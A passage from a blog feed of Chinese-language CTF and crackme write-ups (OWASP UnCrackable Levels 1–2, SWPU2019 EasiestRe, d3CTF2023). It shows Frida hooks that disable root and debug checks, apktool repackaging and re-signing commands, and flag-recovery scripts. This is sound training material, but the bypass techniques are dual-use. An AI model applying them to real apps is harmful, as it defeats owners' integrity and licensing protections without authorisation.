function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    b.<span class="property">b</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    b.<span class="property">c</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f &quot;owasp.mstg.uncrackable2&quot; -l .\script.js --no-pause</span><br></pre></td></tr></table></div></figure><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306022311108.png" alt="image-20230602231111083"></p><p>然后查看校验函数</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306022311528.png" alt="image-20230602231147501"></p><p>仍然是写在native里面</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306022312672.png" alt="image-20230602231203647"></p><p>ida打开</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306022312249.png" alt="image-20230602231219213"></p><p>找到“Thanks for all the fish”</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306022317629.png" alt="image-20230602231721602"></p><p>Thanks for all the fish</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UnCrackable-Level1</title>
      <link href="/2023/05/23/UnCrackable-Level1/"/>
      <url>/2023/05/23/UnCrackable-Level1/</url>
      
        <content type="html"><![CDATA[        <h1 id="UnCrackable-Level1"   >          <a href="#UnCrackable-Level1" class="heading-link"><i class="fas fa-link"></i></a><a href="#UnCrackable-Level1" class="headerlink" title="UnCrackable-Level1"></a>UnCrackable-Level1</h1>      <p>安卓逆向</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305232247241.png" alt="image-20230523224709120"></p><p>jadx打开</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305232248648.png" alt="image-20230523224815607"></p><p>这里进行了校验</p>        <h2 id="利用apktool进行修改后重打包"   >          <a href="#利用apktool进行修改后重打包" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用apktool进行修改后重打包" class="headerlink" title="利用apktool进行修改后重打包"></a>利用apktool进行修改后重打包</h2>      <p>将这段删掉</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305232250784.png" alt="image-20230523225055736"></p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apktool.jar d UnCrackable-Level1.apk</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apktool.jar b UnCrackable-Level1</span><br></pre></td></tr></table></div></figure><p>然后再进行签名</p><p>首先生成自己的密钥</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -alias demo.keystore -keyalg RSA -validity 40000 -keystore demo.keystore</span><br></pre></td></tr></table></div></figure><p>签名</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verbose -keystore demo.keystore UnCrackable-Level1.apk demo.keystore</span><br></pre></td></tr></table></div></figure><p>再安装，成功进入</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305232252932.png" alt="image-20230523225236883"></p><p>找到校验函数</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305232309165.png" alt="image-20230523230937139"></p><p>发现是AES+Base64</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305232310191.png" alt="image-20230523230957620"></p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305232310614.png" alt="image-20230523231010576"></p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305232310536.png" alt="image-20230523231049489"></p><p>I want to believe</p>        <h2 id="frida-HOOK"   >          <a href="#frida-HOOK" class="heading-link"><i class="fas fa-link"></i></a><a href="#frida-HOOK" class="headerlink" title="frida HOOK"></a>frida HOOK</h2>      <p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306022152419.png" alt="image-20230602215239366"></p><p>hook onClick函数使得点OK不退出</p><figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> f = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;sg.vantagepoint.uncrackable1.MainActivity$1&quot;</span>);</span><br><span class="line">    f.<span class="property">onClick</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg1, arg2</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;HOOK!&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -UF -l .\script.js</span><br></pre></td></tr></table></div></figure><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306022154427.png" alt="image-20230602215400404"></p><p>成功进入</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306022155721.png" alt="image-20230602215546699"></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SWPU2019_EasiestRe</title>
      <link href="/2023/05/19/SWPU2019-EasiestRe/"/>
      <url>/2023/05/19/SWPU2019-EasiestRe/</url>
      
        <content type="html"><![CDATA[        <h2 id="SWPU2019-EasiestRe"   >          <a href="#SWPU2019-EasiestRe" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPU2019-EasiestRe" class="headerlink" title="[SWPU2019]EasiestRe"></a>[SWPU2019]EasiestRe</h2>      <p>ida32位打开</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305190057770.png" alt="image-20230519005713699"></p><p>查看main函数</p><p>自我附加反调试</p><p>首先，主进程新建子进程，然后调试子进程。因为每一个进程同一时刻只能被一个调试器附加，因此无法调试子进程，只能静态分析。</p><p>然后用主进程监控调试事件然后往子进程里面写数据</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305190100958.png" alt="image-20230519010051910"></p><p>用keypatch将其还原后</p><p>发现是个背包加密</p><p>首先初始化一个公钥</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305190101637.png" alt="image-20230519010124612"></p><p>然后将明文每个字符的每个比特位（0或1）与公钥相乘并求和</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305190101672.png" alt="image-20230519010157637"></p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">0</span>] * <span class="number">24</span></span><br><span class="line">flag[<span class="number">0</span>] = <span class="number">0x3D1</span></span><br><span class="line">flag[<span class="number">1</span>] = <span class="number">0x2F0</span></span><br><span class="line">flag[<span class="number">2</span>] = <span class="number">0x52</span></span><br><span class="line">flag[<span class="number">3</span>] = <span class="number">0x475</span></span><br><span class="line">flag[<span class="number">4</span>] = <span class="number">0x1D2</span></span><br><span class="line">flag[<span class="number">5</span>] = <span class="number">0x2F0</span></span><br><span class="line">flag[<span class="number">6</span>] = <span class="number">0x224</span></span><br><span class="line">flag[<span class="number">7</span>] = <span class="number">0x51C</span></span><br><span class="line">flag[<span class="number">8</span>] = <span class="number">0x4E6</span></span><br><span class="line">flag[<span class="number">9</span>] = <span class="number">0x29F</span></span><br><span class="line">flag[<span class="number">10</span>] = <span class="number">0x2EE</span></span><br><span class="line">flag[<span class="number">11</span>] = <span class="number">0x39B</span></span><br><span class="line">flag[<span class="number">12</span>] = <span class="number">0x3F9</span></span><br><span class="line">flag[<span class="number">13</span>] = <span class="number">0x32B</span></span><br><span class="line">flag[<span class="number">14</span>] = <span class="number">0x2F2</span></span><br><span class="line">flag[<span class="number">15</span>] = <span class="number">0x5B5</span></span><br><span class="line">flag[<span class="number">16</span>] = <span class="number">0x24C</span></span><br><span class="line">flag[<span class="number">17</span>] = <span class="number">0x45A</span></span><br><span class="line">flag[<span class="number">18</span>] = <span class="number">0x34C</span></span><br><span class="line">flag[<span class="number">19</span>] = <span class="number">0x56D</span></span><br><span class="line">flag[<span class="number">20</span>] = <span class="number">0xA</span></span><br><span class="line">flag[<span class="number">21</span>] = <span class="number">0x4E6</span></span><br><span class="line">flag[<span class="number">22</span>] = <span class="number">0x476</span></span><br><span class="line">flag[<span class="number">23</span>] = <span class="number">0x2D9</span></span><br><span class="line"></span><br><span class="line">key = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">30</span>, <span class="number">57</span>, <span class="number">120</span>, <span class="number">251</span>]</span><br><span class="line"></span><br><span class="line">v13 = <span class="number">0x1234</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先用暴力算出逆元</span></span><br><span class="line">inv = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    w = (inv * flag[i]) % <span class="number">491</span></span><br><span class="line">    x = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> key[<span class="number">7</span> - j] &gt; w:</span><br><span class="line">            x = <span class="string">&quot;0&quot;</span> + x</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x = <span class="string">&quot;1&quot;</span> + x</span><br><span class="line">            w -= key[<span class="number">7</span> - j]</span><br><span class="line">    x = <span class="built_in">int</span>(x, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        x = x ^ <span class="number">0x1234</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x = x ^ flag[i - <span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>swpuctf{y0u_@re_s0_coo1}</p>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>d3CTF2023</title>
      <link href="/2023/05/12/d3CTF_wp/"/>
      <url>/2023/05/12/d3CTF_wp/</url>
      
        <content type="html"><![CDATA[        <h1 id="d3CTF2023"   >          <a href="#d3CTF2023" class="heading-link"><i class="fas fa-link"></i></a><a href="#d3CTF2023" class="headerlink" title="d3CTF2023"></a>d3CTF2023</h1>      <p>AntCTF x D^3CTF 2023 题目复现</p>        <h2 id="d3sky"   >          <a href="#d3sky" class="heading-link"><i class="fas fa-link"></i></a><a href="#d3sky" class="headerlink" title="d3sky"></a>d3sky</h2>      <p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305030154422.png" alt="image-20230503015455343"></p><p>32位打开，加了TLS反调试</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305030155553.png" alt="image-20230503015530528"></p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305030156010.png" alt="image-20230503015559974"></p><p>利用除零异常将密钥改为<code>YunZh1JunAlkaid</code></p><p>然后进行rc4加密</p><p>主函数的逻辑比较简单的虚拟机</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305030158782.png" alt="image-20230503015802739"></p><p>以v9为偏移然后读取三个字符后进行rc4加密</p><p>将加密后的数据作为操作码进行执行</p><p>然后再加密打乱Sbox</p><p>首先提取出指令码进行解密</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">0x009E</span>, <span class="number">0x0028</span>, <span class="number">0x00F5</span>, <span class="number">0x0075</span>, <span class="number">0x0073</span>, <span class="number">0x0073</span>, <span class="number">0x0030</span>, <span class="number">0x007E</span>, <span class="number">0x0048</span>, <span class="number">0x0048</span>, <span class="number">0x00F2</span>, <span class="number">0x002F</span>, <span class="number">0x003D</span>, <span class="number">0x00EC</span>,</span><br><span class="line">       <span class="number">0x0001</span>, <span class="number">0x0026</span>, <span class="number">0x003E</span>, <span class="number">0x00CD</span>, <span class="number">0x0082</span>, <span class="number">0x00AD</span>, <span class="number">0x00B1</span>, <span class="number">0x00D1</span>, <span class="number">0x0036</span>, <span class="number">0x00D2</span>, <span class="number">0x00B4</span>, <span class="number">0x00E5</span>, <span class="number">0x00E8</span>, <span class="number">0x004C</span>,</span><br><span class="line">       <span class="number">0x003D</span>, <span class="number">0x000C</span>, <span class="number">0x0073</span>, <span class="number">0x00FD</span>, <span class="number">0x0059</span>, <span class="number">0x00A7</span>, <span class="number">0x0048</span>, <span class="number">0x0093</span>, <span class="number">0x00FD</span>, <span class="number">0x0006</span>, <span class="number">0x00E0</span>, <span class="number">0x0044</span>, <span class="number">0x0048</span>, <span class="number">0x0071</span>,</span><br><span class="line">       <span class="number">0x0094</span>, <span class="number">0x004A</span>, <span class="number">0x008E</span>, <span class="number">0x00A4</span>, <span class="number">0x0036</span>, <span class="number">0x0091</span>, <span class="number">0x0023</span>, <span class="number">0x00EE</span>, <span class="number">0x0068</span>, <span class="number">0x00C1</span>, <span class="number">0x005D</span>, <span class="number">0x000B</span>, <span class="number">0x004D</span>, <span class="number">0x001A</span>,</span><br><span class="line">       <span class="number">0x0074</span>, <span class="number">0x0083</span>, <span class="number">0x0051</span>, <span class="number">0x0052</span>, <span class="number">0x00EE</span>, <span class="number">0x00FE</span>, <span class="number">0x0011</span>, <span class="number">0x00A2</span>, <span class="number">0x00A1</span>, <span class="number">0x0064</span>, <span class="number">0x00BD</span>, <span class="number">0x0098</span>, <span class="number">0x004D</span>, <span class="number">0x00B9</span>,</span><br><span class="line">       <span class="number">0x0097</span>, <span class="number">0x0045</span>, <span class="number">0x00E6</span>, <span class="number">0x00F7</span>]</span><br><span class="line"></span><br><span class="line">box = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"></span><br><span class="line">op = [...]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_intit</span>():</span><br><span class="line">    k = <span class="string">&quot;YunZh1JunAlkaid&quot;</span></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">        key.append(<span class="built_in">ord</span>(i))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        box[i] = i</span><br><span class="line"></span><br><span class="line">    v6 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        v8 = box[i]</span><br><span class="line">        v6 = (v6 + v8 + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xff</span></span><br><span class="line">        box[i] = box[v6]</span><br><span class="line">        box[v6] = v8</span><br><span class="line"></span><br><span class="line">    v5 = <span class="number">0</span></span><br><span class="line">    v6 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)):</span><br><span class="line">        v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        v7 = box[v5]</span><br><span class="line">        v6 = (v6 + v7) % <span class="number">256</span></span><br><span class="line">        v8 = box[v6]</span><br><span class="line">        box[v5] = v8</span><br><span class="line">        box[v6] = v7</span><br><span class="line">        arr[i] ^= (box[(v7 + v8) % <span class="number">256</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">st, end</span>):</span><br><span class="line">    v5 = <span class="number">0</span></span><br><span class="line">    v6 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(st, end):</span><br><span class="line">        v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        v7 = box[v5]</span><br><span class="line">        v6 = (v6 + v7) % <span class="number">256</span></span><br><span class="line">        v8 = box[v6]</span><br><span class="line">        box[v5] = v8</span><br><span class="line">        box[v6] = v7</span><br><span class="line">        op[i] ^= (box[(v7 + v8) % <span class="number">256</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    rc4_intit()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(op)-<span class="number">3</span>, <span class="number">3</span>):</span><br><span class="line">        rc4(i, i + <span class="number">3</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(op[i]), <span class="built_in">hex</span>(op[i + <span class="number">1</span>]), <span class="built_in">hex</span>(op[i + <span class="number">2</span>]))</span><br><span class="line">        <span class="keyword">if</span> op[i + <span class="number">2</span>] == <span class="number">0x13</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n判断：&quot;</span>)</span><br><span class="line"></span><br><span class="line">        rc4(i, i + <span class="number">3</span>)</span><br></pre></td></tr></table></div></figure><p>看出指令码非常的有规律</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305030201808.png" alt="image-20230503020112776"></p><p>虽然这个虚拟机只有与非运算，但是众所周知，与非门是一种通用的逻辑门，因为任何布尔运算都可以用与非来实现</p><p>A ^ B &#x3D; !A * B + A * !B &#x3D; !(A<em>A) * B + A * !(B*B) &#x3D; !( !( !(A</em>A) * B ) * !( A * !(B*B) ) ) </p><p>然后动调获取密文</p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0x24</span>, <span class="number">0x0B</span>, <span class="number">0x6D</span>, <span class="number">0x0F</span>, <span class="number">0x03</span>, <span class="number">0x32</span>, <span class="number">0x42</span>, <span class="number">0x1D</span>,</span><br><span class="line">       <span class="number">0x2B</span>, <span class="number">0x43</span>, <span class="number">0x78</span>, <span class="number">0x43</span>, <span class="number">0x73</span>, <span class="number">0x30</span>, <span class="number">0x2B</span>, <span class="number">0x4E</span>,</span><br><span class="line">       <span class="number">0x63</span>, <span class="number">0x48</span>, <span class="number">0x77</span>, <span class="number">0x2E</span>, <span class="number">0x32</span>, <span class="number">0x39</span>, <span class="number">0x1A</span>, <span class="number">0x12</span>,</span><br><span class="line">       <span class="number">0x71</span>, <span class="number">0x7A</span>, <span class="number">0x42</span>, <span class="number">0x17</span>, <span class="number">0x45</span>, <span class="number">0x72</span>, <span class="number">0x56</span>, <span class="number">0x0C</span>,</span><br><span class="line">       <span class="number">0x5C</span>, <span class="number">0x4A</span>, <span class="number">0x62</span>, <span class="number">0x53</span>, <span class="number">0x33</span>]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">x = [BitVec(<span class="string">&#x27;x[%d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>):</span><br><span class="line">    s.add(enc[i] == x[i % <span class="number">37</span>] ^ x[(i + <span class="number">1</span>) % <span class="number">37</span>] ^ x[(i + <span class="number">2</span>) % <span class="number">37</span>] ^ x[(i + <span class="number">3</span>) % <span class="number">37</span>])</span><br><span class="line">s.add(x[<span class="number">36</span>] == <span class="number">0x7e</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    result = s.model()</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(result[each].as_long()), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>flag{A_Sin91e_InS7rUcti0N_ViRTua1_M4chin3~}</p>        <h2 id="d3rc4"   >          <a href="#d3rc4" class="heading-link"><i class="fas fa-link"></i></a><a href="#d3rc4" class="headerlink" title="d3rc4"></a>d3rc4</h2>      <p>64位</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305051416834.png" alt="image-20230505141636756"></p><p>只是rc4加密，直接动调提取异或的keystream</p><p>然而解密后是假flag</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fake = [0xDB, 0xB6, 0x2A, 0x04, 0xC7, 0xB9, 0x68, 0xE0, 0xBD, 0x3E, 0x04, 0x6F, 0xD3, 0x38, 0x10, 0x6B, 0x4A, 0xE5,</span><br><span class="line">        0x61, 0xA7, 0x24, 0x0D, 0xFC, 0x73, 0xAA, 0x71, 0xF8, 0x10, 0x0D, 0x7D, 0x55, 0x6E, 0x43]</span><br><span class="line">enc = [0xb8, 0x86, 0x44, 0x63, 0xb5, 0xd8, 0x1c, 0x95,</span><br><span class="line">       0xd1, 0x7e, 0x70, 0x5e, 0xbc, 0x56, 0x63, 0x34,</span><br><span class="line">       0x28, 0x90, 0x15, 0xf8, 0x4d, 0x52, 0x9d, 0x1e,</span><br><span class="line">       0xf5, 0x1f, 0xc8, 0x64, 0x52, 0x1b, 0x64, 0x0f,</span><br><span class="line">       0x24, 0x93, 0x40, 0x5d, 0x84, 0x93, 0x7d, 0x92,</span><br><span class="line">       0x0a]</span><br><span class="line"></span><br><span class="line">for i in range(len(fake)):</span><br><span class="line">    x = fake[i] ^ enc[i]</span><br><span class="line">    print(chr(x), end=&quot;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>c0ngratul@t1ons_but_i_am_n0t_f1ag</p><p>调试以及查看函数表可知</p><p>在main函数之前有init函数，负责对key以及输出的初始化</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305051422786.png" alt="image-20230505142246727"></p><p>在main函数之后，还有fini对输入做进一步的校验</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305051423243.png" alt="image-20230505142357182"></p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305051424048.png" alt="image-20230505142422977"></p><p>大概分析了一下他fork调用的流程</p><p>总的来说，利用管道对key进行修改。打开一个子进程然后修改key</p><p>子进程又打开子进程。</p><p>因为有wait函数，当前进程会等待其子进程结束后再继续运行</p><p>利用gdb进行调试</p><p>首先在fork出下断</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305051429212.png" alt="image-20230505142947162"></p><p>这里会进行创建子进程，因此如果想要跟踪子进程，就得将gdb的跟踪模式从主进程切换到子进程</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set follow-fork-mode child</span><br></pre></td></tr></table></div></figure><p>切换到子进程后在校验处下断</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305051432694.png" alt="image-20230505143227640"></p><p>对应ida里面的</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305051433548.png" alt="image-20230505143300500"></p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305051433714.png" alt="image-20230505143338667"></p><p>提取rdx里面的值，写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">0xF7</span>, <span class="number">0x5F</span>, <span class="number">0xE7</span>, <span class="number">0xB0</span>, <span class="number">0x9A</span>, <span class="number">0xB4</span>, <span class="number">0xE0</span>, <span class="number">0xE7</span>, <span class="number">0x9E</span>, <span class="number">0x05</span>, <span class="number">0xFE</span>, <span class="number">0xD8</span>, <span 